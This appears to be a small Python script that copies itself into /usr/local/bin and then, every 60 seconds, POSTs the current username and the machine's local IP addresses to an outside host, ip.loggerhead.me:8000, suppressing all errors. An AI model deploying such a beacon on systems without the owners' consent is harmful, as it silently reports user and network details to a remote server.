#!/usr/bin/env python
import os
import time
import shutil
import inspect
import requests

HOST = "ip.loggerhead.me"
PORT = 8000
INTERVAL = 60

__source_path__ = os.path.abspath(inspect.getsourcefile(lambda:0))


def get_ips():
    CMD = '''#!/bin/sh
    re="\d+\.\d+\.\d+\.\d+"
    ips=$(ifconfig | egrep $re | egrep -o "inet $re" | sed -E "s/(inet|127\.0\.0\.1)//g")

    for ip in $ips
    do
        echo $ip
    done'''

    return os.popen(CMD).read().split()

def copy_to_dst(dst):
    curdir = os.path.abspath(os.path.curdir)
    if curdir == dst:
        return

    try:
        shutil.copy2(__source_path__, dst)
    except:
        pass

def main():
    URL = "http://%s:%d" % (HOST, PORT)

    who = os.popen('whoami').read().strip()
    data = {'who': who}

    while True:
        try:
            data["IPs"] = get_ips()
            requests.post(URL, data=data)
        except KeyboardInterrupt:
            return
        except:
            pass
        time.sleep(INTERVAL)


try:
    copy_to_dst('/usr/local/bin')
    main()
except KeyboardInterrupt:
    pass
